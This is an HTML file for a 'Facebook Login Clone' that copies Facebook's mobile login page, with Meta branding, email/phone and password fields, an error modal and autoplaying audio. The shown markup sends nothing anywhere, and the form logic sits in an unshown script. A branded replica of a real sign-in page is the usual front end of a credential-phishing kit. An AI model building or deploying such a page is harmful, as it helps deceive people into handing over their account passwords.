<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Clone</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Facebook</h1>
        </div>
        <div class="content">
            <p>By proceeding, you agree to <a href="#">Globe's Terms</a> which includes letting Facebook request and receive your phone number. <a href="#">Change Settings</a></p>
            <form id="loginForm">
                <input type="text" id="emailOrPhone" placeholder="Mobile number or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <a href="#" class="forgot-password">Forgot password?</a>
            <button class="create-account">Create new account</button>
        </div>
        <div class="footer">
            <p>&copy; Meta</p>
            <div class="footer-links">
                <a href="#">About</a>
                <a href="#">Help</a>
                <a href="#">More</a>
            </div>
        </div>
    </div>

    <!-- Error Modal -->
    <div id="errorModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <p>Email or mobile number required</p>
            <p>Enter your email or mobile number to continue.</p>
            <button id="closeModal">OK</button>
        </div>
    </div>
    <!-- Audio played automatically -->
    <audio id="backgroundAudio" src="Goodmusic.mp3.mp3"></audio>
    <script src="script.js"></script>
</body>
</html>
